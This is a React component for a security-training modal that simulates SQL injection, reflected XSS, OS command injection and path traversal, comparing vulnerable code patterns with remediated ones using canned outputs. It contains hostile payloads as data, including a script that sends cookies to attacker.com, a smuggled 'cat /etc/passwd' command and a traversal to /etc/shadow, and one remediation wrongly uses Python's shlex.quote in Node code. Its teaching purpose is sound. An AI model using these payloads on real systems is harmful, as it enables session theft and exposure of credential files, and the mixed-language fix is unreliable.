import React, { useState } from 'react';
import { Shield, Play, Terminal, CheckCircle2, AlertTriangle, X, RefreshCw, Lock, Zap } from 'lucide-react';

const PRESET_EXPLOITS = [
  {
    id: 'sqli',
    category: 'SQL Injection (CWE-89)',
    payload: "' OR '1'='1' --",
    description: 'Bypasses SQL query parameters and authentication checks by injecting boolean TRUE conditionals.',
    vulnerableTemplate: "SELECT * FROM users WHERE username = '${input}' AND password = '${password}'",
    remediatedTemplate: "SELECT * FROM users WHERE username = ? AND password = ?",
    simulatedResultUnsafe: "Query Executed: SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '' -> Returned ALL 50,000 user rows!",
    simulatedResultSafe: "Query Executed: SELECT * FROM users WHERE username = ? AND password = ? (Params: [\"' OR '1'='1' --\", \"***\"]) -> 0 rows returned (Safely Escaped)."
  },
  {
    id: 'xss',
    category: 'Reflected Cross-Site Scripting (CWE-79)',
    payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
    description: 'Executes malicious JavaScript in browser context when unsanitized input is rendered into HTML.',
    vulnerableTemplate: "<div id='user-profile'>Welcome, ${input}</div>",
    remediatedTemplate: "<div id='user-profile'>Welcome, {DOMPurify.sanitize(input)}</div>",
    simulatedResultUnsafe: "Rendered HTML: <div>Welcome, <script>fetch(...)</script></div> -> Session Hijacked! Cookie sent to attacker.",
    simulatedResultSafe: "Rendered HTML: <div>Welcome, &lt;script&gt;fetch(...)&lt;/script&gt;</div> -> Safe Text Displayed."
  },
  {
    id: 'cmdi',
    category: 'OS Command Injection (CWE-78)',
    payload: "127.0.0.1; cat /etc/passwd; id",
    description: 'Executes secondary OS commands when user input is passed directly to system shell execution.',
    vulnerableTemplate: "child_process.exec(`ping -c 1 ${input}`)",
    remediatedTemplate: "child_process.execFile('/bin/ping', ['-c', '1', shlex.quote(input)])",
    simulatedResultUnsafe: "Shell Output: PING 127.0.0.1... root:x:0:0:root:/root:/bin/bash uid=0(root) gid=0(root)",
    simulatedResultSafe: "Shell Output: ping: 127.0.0.1; cat /etc/passwd; id: Name or service not known (Arguments Isolated)."
  },
  {
    id: 'path',
    category: 'Path Traversal (CWE-22)',
    payload: "../../../../etc/shadow",
    description: 'Accesses files outside intended web directory by abusing relative path navigation.',
    vulnerableTemplate: "fs.readFileSync('/var/www/uploads/' + input)",
    remediatedTemplate: "fs.readFileSync(path.join('/var/www/uploads/', path.basename(input)))",
    simulatedResultUnsafe: "File Opened: /etc/shadow -> Exposed password hashes: root:$6$r9xQ...:18902:0:99999:7:::",
    simulatedResultSafe: "File Opened: /var/www/uploads/shadow -> File Not Found (Directory Traversal Blocked)."
  }
];

export default function PayloadSandboxModal({ isOpen, onClose, initialPayloadType = 'sqli' }) {
  const [selectedExploit, setSelectedExploit] = useState(() => {
    return PRESET_EXPLOITS.find((e) => e.id === initialPayloadType) || PRESET_EXPLOITS[0];
  });

  const [customPayload, setCustomPayload] = useState(selectedExploit.payload);
  const [isRunning, setIsRunning] = useState(false);
  const [simulationOutput, setSimulationOutput] = useState(null);

  if (!isOpen) return null;

  const handleSelectExploit = (exploit) => {
    setSelectedExploit(exploit);
    setCustomPayload(exploit.payload);
    setSimulationOutput(null);
  };

  const handleRunSimulation = () => {
    setIsRunning(true);
    setSimulationOutput(null);

    setTimeout(() => {
      setIsRunning(false);
      const isCustomMatch = customPayload === selectedExploit.payload;
      
      setSimulationOutput({
        unsafeOutput: isCustomMatch 
          ? selectedExploit.simulatedResultUnsafe 
          : `[UNSAFE EXPLOIT DETECTED] Payload "${customPayload}" executed directly in vulnerable context! Data leak / code execution verified.`,
        safeOutput: isCustomMatch 
          ? selectedExploit.simulatedResultSafe 
          : `[SAFE REFRESH] Payload "${customPayload}" safely sanitized / bound. Sanitizer prevented execution.`,
        timestamp: new Date().toLocaleTimeString()
      });
    }, 600);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-md animate-fadeIn">
      <div className="bg-slate-900 border border-slate-800 text-slate-100 rounded-2xl w-full max-w-4xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden font-sans">
        
        {/* Header */}
        <div className="bg-[#0c0e15] px-6 py-4 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-amber-500/20 to-rose-500/20 border border-amber-500/30 flex items-center justify-center text-amber-400">
              <Zap size={20} />
            </div>
            <div>
              <h3 className="text-base font-black text-white flex items-center gap-2">
                <span>Interactive Attack Payload Sandbox Simulator</span>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase bg-amber-500/10 text-amber-400 border border-amber-500/20">
                  Solo Security Workbench
                </span>
              </h3>
              <p className="text-xs text-slate-400">
                Simulate exploit payloads against unsafe vs. remediated code contexts in real-time
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-2 text-slate-400 hover:text-white hover:bg-slate-800 rounded-xl transition-colors cursor-pointer"
          >
            <X size={18} />
          </button>
        </div>

        {/* Content Body */}
        <div className="p-6 overflow-y-auto custom-scrollbar space-y-5 flex-1">
          
          {/* Preset Category Switcher */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            {PRESET_EXPLOITS.map((exp) => (
              <button
                key={exp.id}
                onClick={() => handleSelectExploit(exp)}
                className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                  selectedExploit.id === exp.id
                    ? 'bg-indigo-600/20 border-indigo-500 text-white shadow-lg shadow-indigo-500/10'
                    : 'bg-slate-950/60 hover:bg-slate-800/60 border-slate-800 text-slate-400'
                }`}
              >
                <div className="text-xs font-bold truncate">{exp.category.split(' ')[0]} {exp.category.split(' ')[1]}</div>
                <div className="text-[10px] text-slate-400 truncate">{exp.category.split('(')[1]?.replace(')', '') || ''}</div>
              </button>
            ))}
          </div>

          {/* Active Category Description */}
          <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 flex items-start gap-3">
            <AlertTriangle size={18} className="text-amber-400 shrink-0 mt-0.5" />
            <div className="text-xs space-y-1">
              <span className="font-bold text-white block">{selectedExploit.category}</span>
              <p className="text-slate-400 leading-relaxed">{selectedExploit.description}</p>
            </div>
          </div>

          {/* Interactive Payload Input Box */}
          <div className="space-y-2">
            <label className="block text-xs font-bold text-slate-300">
              Target Attack Payload Input
            </label>
            <div className="flex gap-2">
              <div className="relative flex-1">
                <input
                  type="text"
                  value={customPayload}
                  onChange={(e) => setCustomPayload(e.target.value)}
                  placeholder="Enter custom attack vector payload..."
                  className="w-full bg-slate-950 border border-slate-700 focus:border-amber-500 rounded-xl px-4 py-2.5 text-xs text-amber-300 font-mono focus:outline-none focus:ring-1 focus:ring-amber-500/30 transition-all"
                />
              </div>
              <button
                onClick={handleRunSimulation}
                disabled={isRunning}
                className="flex items-center gap-2 bg-gradient-to-r from-amber-500 to-rose-500 hover:from-amber-400 hover:to-rose-400 text-black font-black text-xs px-5 py-2.5 rounded-xl shadow-lg transition-all cursor-pointer disabled:opacity-50"
              >
                {isRunning ? (
                  <RefreshCw size={14} className="animate-spin text-black" />
                ) : (
                  <Play size={14} className="fill-black" />
                )}
                <span>{isRunning ? 'Simulating...' : 'Simulate Payload'}</span>
              </button>
            </div>
          </div>

          {/* Code Execution Side-by-Side Comparison */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            
            {/* Unsafe Vulnerable Code */}
            <div className="space-y-2">
              <div className="flex items-center justify-between text-xs px-1">
                <span className="font-bold text-rose-400 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-rose-500" />
                  Vulnerable Unsafe Execution Context
                </span>
                <span className="text-[10px] text-rose-400/80 font-mono">UNSAFE</span>
              </div>
              <div className="bg-slate-950 border border-rose-500/30 rounded-xl p-3 font-mono text-[11px] text-slate-300 space-y-2">
                <p className="text-[10px] text-slate-500">Pattern:</p>
                <code className="text-rose-300 block bg-rose-500/10 p-2 rounded border border-rose-500/20 overflow-x-auto">
                  {selectedExploit.vulnerableTemplate}
                </code>
              </div>
            </div>

            {/* Safe Remediated Code */}
            <div className="space-y-2">
              <div className="flex items-center justify-between text-xs px-1">
                <span className="font-bold text-emerald-400 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-emerald-500" />
                  Remediated Severa AI Secured Context
                </span>
                <span className="text-[10px] text-emerald-400 font-mono">SAFE</span>
              </div>
              <div className="bg-slate-950 border border-emerald-500/30 rounded-xl p-3 font-mono text-[11px] text-slate-300 space-y-2">
                <p className="text-[10px] text-slate-500">Pattern:</p>
                <code className="text-emerald-300 block bg-emerald-500/10 p-2 rounded border border-emerald-500/20 overflow-x-auto">
                  {selectedExploit.remediatedTemplate}
                </code>
              </div>
            </div>

          </div>

          {/* Simulation Output Console */}
          {simulationOutput && (
            <div className="space-y-3 pt-2 animate-fadeIn">
              <div className="flex items-center justify-between text-xs font-bold text-slate-300">
                <span className="flex items-center gap-1.5 text-cyan-400">
                  <Terminal size={14} />
                  <span>Real-Time Payload Simulation Console Output</span>
                </span>
                <span className="text-[10px] text-slate-500">{simulationOutput.timestamp}</span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div className="bg-slate-950 border border-rose-500/30 rounded-xl p-3 text-xs text-rose-300 font-mono space-y-1">
                  <span className="text-[10px] font-bold text-rose-400 uppercase block">Unsafe Context Output:</span>
                  <p className="leading-relaxed">{simulationOutput.unsafeOutput}</p>
                </div>

                <div className="bg-slate-950 border border-emerald-500/30 rounded-xl p-3 text-xs text-emerald-300 font-mono space-y-1">
                  <span className="text-[10px] font-bold text-emerald-400 uppercase block">Sanitized Context Output:</span>
                  <p className="leading-relaxed">{simulationOutput.safeOutput}</p>
                </div>
              </div>
            </div>
          )}

        </div>

        {/* Footer */}
        <div className="bg-[#0c0e15] px-6 py-3 border-t border-slate-800 flex items-center justify-between text-xs">
          <span className="text-slate-400 flex items-center gap-1.5">
            <Lock size={13} className="text-emerald-400" />
            <span>Client-Side Isolated Sandbox (Zero Network Retention)</span>
          </span>
          <button
            onClick={onClose}
            className="px-4 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold transition-all cursor-pointer"
          >
            Close Sandbox
          </button>
        </div>

      </div>
    </div>
  );
}
